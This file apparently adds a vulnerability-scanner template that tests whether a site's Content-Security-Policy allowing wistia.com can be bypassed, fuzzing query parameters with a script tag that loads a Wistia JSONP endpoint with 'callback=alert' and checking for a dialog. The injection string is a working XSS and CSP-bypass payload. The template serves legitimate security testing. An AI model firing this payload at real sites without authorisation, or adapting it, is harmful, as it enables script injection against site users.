@@ -1,0 +1,55 @@
+id: wistia-fast-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Wistia Fast
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,wistia-fast
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "wistia.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: wistia_fast_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "wistia_fast_csp_xss == true"
+# digest: 4a0a0047304502205c6e0ccdd8267a7fa89f883b9f30b6c8a465cd7cf0a71a47eac677afc94cb770022100a0e11348a8d0196c81f89b03b622f20ee4028a67d75527f4e5fc7dee77b85553:922c64590222798bb761d5b6d8e72950
